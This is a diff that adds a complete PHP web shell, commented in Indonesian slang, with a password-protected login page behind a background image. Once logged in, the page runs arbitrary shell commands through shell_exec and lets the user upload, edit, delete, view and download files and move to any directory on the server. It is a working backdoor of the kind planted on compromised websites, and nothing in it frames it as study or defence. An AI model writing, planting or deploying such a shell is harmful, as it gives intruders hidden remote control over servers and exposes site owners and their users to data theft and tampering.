@@ -1,0 +1,327 @@
+<?php
+error_reporting(0);
+
+// ========== KONFIGURASI ==========
+// Password hash punya lu bray!
+$config = [
+    'pass' => '$2a$12$4Ax1TZKOob80.RLDdcFor.iJBpO6/bpdJJIiz8L1UkGhgLikefNhm', // hash bcrypt lu
+    'bg_image' => 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLzEFTrSexfvWHF3Q0FkoLu_qNW9JoPyWxHy5ePZE97BdA1KznzlB8-OdbRszy1xyIi35pi606UQusTEDt-EYo_Nii7m5BUeIvmEiitTUKIJOlZlniTQIKh82C5ASgQRgucOCwwfyiAorS9Hn8vyiBNOPYMdACDc4uF0a3rqavMaGMHFtpnRjK2wxXINVS/s16000/rudeus.png',
+    'title' => 'Rudy'  // Judul yang tampil
+];
+
+// Cek cookie login
+$logged = false;
+if (isset($_COOKIE['shell_hash']) && $_COOKIE['shell_hash'] === md5($config['pass'])) {
+    $logged = true;
+}
+
+// Proses login - cuma password!
+if (!$logged && isset($_POST['pass'])) {
+    if (password_verify($_POST['pass'], $config['pass'])) {
+        setcookie('shell_hash', md5($config['pass']), time()+86400*7, '/');
+        $logged = true;
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = 'Password salah!';
+    }
+}
+
+// ========== HALAMAN LOGIN (STYLE DARI GAMBAR LU) ==========
+if (!$logged) {
+    $bg = $config['bg_image'];
+    $title = $config['title'];
+    echo '<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>'.$title.'</title>
+        <style>
+            @import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@200;300;400;500;600;700&display=swap");
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: "Open Sans", sans-serif;
+            }
+            body {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 100vh;
+                width: 100%;
+                padding: 0 10px;
+            }
+            body::before {
+                content: "";
+                position: absolute;
+                width: 100%;
+                height: 100%;
+                background: url("'.$bg.'"), #000;
+                background-position: center;
+                background-size: cover;
+                background-attachment: fixed;
+            }
+            .wrapper {
+                width: 400px;
+                border-radius: 8px;
+                padding: 30px;
+                text-align: center;
+                border: 1px solid rgba(255, 255, 255, 0.5);
+                backdrop-filter: blur(8px);
+                background-color: rgba(0, 0, 0, 0.5);
+                -webkit-backdrop-filter: blur(8px);
+            }
+            form {
+                display: flex;
+                flex-direction: column;
+            }
+            h2 {
+                font-size: 2rem;
+                margin-bottom: 20px;
+                color: #fff;
+            }
+            .input-field {
+                position: relative;
+                border-bottom: 2px solid #ccc;
+                margin: 15px 0;
+            }
+            .input-field label {
+                position: absolute;
+                top: 50%;
+                left: 0;
+                transform: translateY(-50%);
+                color: #fff;
+                font-size: 16px;
+                pointer-events: none;
+                transition: 0.15s ease;
+            }
+            .input-field input {
+                width: 100%;
+                height: 40px;
+                background: transparent;
+                border: none;
+                outline: none;
+                font-size: 16px;
+                color: #fff;
+            }
+            .input-field input:focus ~ label,
+            .input-field input:valid ~ label {
+                font-size: 0.8rem;
+                top: 10px;
+                transform: translateY(-120%);
+            }
+            button {
+                background: #fff;
+                color: #000;
+                font-weight: 600;
+                border: none;
+                padding: 12px 20px;
+                cursor: pointer;
+                border-radius: 8px;
+                font-size: 16px;
+                border: 2px solid transparent;
+                transition: 0.3s ease;
+                margin-top: 20px;
+            }
+            button:hover {
+                color: #fff;
+                border-color: #fff;
+                background: rgba(255, 255, 255, 0.15);
+            }
+            .error {
+                color: #ff6b6b;
+                margin-top: 15px;
+                text-align: center;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="wrapper">
+            <form method="POST">
+                <h2>'.$title.'</h2>
+                <div class="input-field">
+                    <input type="password" name="pass" id="pass" required autofocus>
+                    <label>Enter your password</label>
+                </div>
+                <button type="submit">Log In</button>';
+                if (isset($error)) echo '<div class="error">'.$error.'</div>';
+                echo '
+            </form>
+        </div>
+        <script>
+            document.getElementById("pass").focus();
+        </script>
+    </body>
+    </html>';
+    exit;
+}
+
+// ========== SHELL UTAMA ==========
+$cwd = isset($_POST['cwd']) ? $_POST['cwd'] : (isset($_GET['cwd']) ? $_GET['cwd'] : getcwd());
+if (!is_dir($cwd)) $cwd = dirname($cwd);
+chdir($cwd);
+
+$action = isset($_GET['a']) ? $_GET['a'] : (isset($_POST['a']) ? $_POST['a'] : '');
+if ($action == 'logout') {
+    setcookie('shell_hash', '', time()-3600, '/');
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+if ($action == 'upload' && isset($_FILES['file'])) {
+    $target = $cwd . '/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) $msg = "Upload OK";
+    else $msg = "Upload gagal";
+}
+if ($action == 'delete' && isset($_POST['file'])) {
+    $f = $cwd . '/' . basename($_POST['file']);
+    if (is_file($f)) unlink($f);
+    elseif (is_dir($f)) rmdir($f);
+    $msg = "Deleted";
+}
+if ($action == 'mkdir' && isset($_POST['dirname'])) {
+    mkdir($cwd . '/' . basename($_POST['dirname']), 0755);
+    $msg = "Dir created";
+}
+if ($action == 'cmd' && isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    $output = shell_exec($cmd . " 2>&1");
+    if ($output === null) $output = "Command execution failed";
+}
+
+$files = scandir($cwd);
+$dirs = $files_arr = [];
+foreach ($files as $f) {
+    $path = $cwd . '/' . $f;
+    if ($f == '.' || $f == '..') continue;
+    if (is_dir($path)) $dirs[] = $f;
+    else $files_arr[] = $f;
+}
+sort($dirs);
+sort($files_arr);
+$all = array_merge($dirs, $files_arr);
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Shell | <?=htmlspecialchars($cwd)?></title>
+    <style>
+        body{background:#000; color:#0f0; font-family:monospace; margin:20px;}
+        a{color:#0f0; text-decoration:none;}
+        a:hover{color:#fff;}
+        table{border-collapse:collapse; width:100%;}
+        th,td{border:1px solid #0f0; padding:5px; text-align:left;}
+        th{background:#0a0; color:#000;}
+        .file{background:#111;}
+        .dir{background:#122;}
+        .bar{background:#0a0; padding:5px; margin-bottom:10px;}
+        input,textarea,select{background:#111; color:#0f0; border:1px solid #0f0; padding:5px;}
+        button{background:#0a0; color:#000; border:none; padding:5px 10px; cursor:pointer;}
+        .cmd-area{background:#111; padding:10px; margin-top:10px;}
+        pre{background:#111; padding:10px; overflow:auto;}
+    </style>
+</head>
+<body>
+    <div class="bar">
+        <b>Shell | </b>
+        <a href="?a=logout">[Logout]</a>
+        <form method="post" style="display:inline-block; margin-left:20px;">
+            <input type="text" name="cwd" value="<?=htmlspecialchars($cwd)?>" size="50">
+            <button type="submit">CD</button>
+        </form>
+    </div>
+
+    <form method="post" enctype="multipart/form-data" action="?a=upload">
+        <input type="file" name="file">
+        <button type="submit">Upload</button>
+        <?php if(isset($msg)) echo "<span style='margin-left:10px'>$msg</span>"; ?>
+    </form>
+
+    <form method="post" action="?a=mkdir" style="display:inline-block; margin-left:20px;">
+        <input type="text" name="dirname" placeholder="new folder">
+        <button type="submit">MkDir</button>
+    </form>
+
+    <table style="margin-top:15px;">
+        <tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th><tr>
+        <?php foreach ($all as $item): 
+            $path = $cwd . '/' . $item;
+            $is_dir = is_dir($path);
+            $size = $is_dir ? '-' : filesize($path);
+            $perms = substr(sprintf('%o', fileperms($path)), -4);
+            $class = $is_dir ? 'dir' : 'file';
+        ?>
+        <tr class="<?=$class?>">
+            <td>
+                <?php if ($is_dir): ?>
+                    <a href="?cwd=<?=urlencode($path)?>"><?=htmlspecialchars($item)?>/</a>
+                <?php else: ?>
+                    <a href="?a=view&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>"><?=htmlspecialchars($item)?></a>
+                <?php endif; ?>
+            </td>
+            <td><?=$size?></td>
+            <td><?=$perms?></td>
+            <td>
+                <?php if (!$is_dir): ?>
+                <a href="?a=edit&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>">Edit</a> |
+                <a href="?a=download&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>">DL</a> |
+                <?php endif; ?>
+                <form method="post" action="?a=delete" style="display:inline;">
+                    <input type="hidden" name="file" value="<?=htmlspecialchars($item)?>">
+                    <button type="submit" onclick="return confirm('Hapus?')">Del</button>
+                </form>
+            </td>
+        </tr>
+        <?php endforeach; ?>
+    </table>
+
+    <div class="cmd-area">
+        <form method="post" action="?a=cmd">
+            <input type="text" name="cmd" placeholder="Perintah (ls -la, whoami, dll)" size="70">
+            <button type="submit">Exec</button>
+        </form>
+        <?php if (isset($output)): ?>
+            <pre><?=htmlspecialchars($output)?></pre>
+        <?php endif; ?>
+    </div>
+
+    <?php if ($action == 'view' && isset($_GET['file'])): 
+        $file = $cwd . '/' . basename($_GET['file']);
+        if (is_file($file) && is_readable($file)):
+            $content = htmlspecialchars(file_get_contents($file));
+    ?>
+        <h3>View: <?=htmlspecialchars(basename($file))?></h3>
+        <pre style="max-height:400px;"><?=$content?></pre>
+        <a href="?a=edit&file=<?=urlencode(basename($file))?>&cwd=<?=urlencode($cwd)?>">Edit</a>
+    <?php endif; endif; ?>
+
+    <?php if ($action == 'edit' && isset($_GET['file'])):
+        $file = $cwd . '/' . basename($_GET['file']);
+        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
+            file_put_contents($file, $_POST['content']);
+            echo "<div style='color:#0f0;'>Saved!</div>";
+            $content = htmlspecialchars($_POST['content']);
+        } else {
+            $content = htmlspecialchars(file_get_contents($file));
+        }
+    ?>
+        <h3>Edit: <?=htmlspecialchars(basename($file))?></h3>
+        <form method="post">
+            <textarea name="content" rows="20" style="width:100%;"><?=$content?></textarea><br>
+            <button type="submit">Save</button>
+            <a href="?a=view&file=<?=urlencode(basename($file))?>&cwd=<?=urlencode($cwd)?>">Cancel</a>
+        </form>
+    <?php endif; ?>
+
+    <?php if ($action == 'download' && isset($_GET['file'])):
+        $file = $cwd . '/' . basename($_GET['file']);
+        if (is_file($file)) {
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="'.basename($file).'"');
+            readfile($file);
+            exit;
+        }
+    endif; ?>
+</body>
+</html>
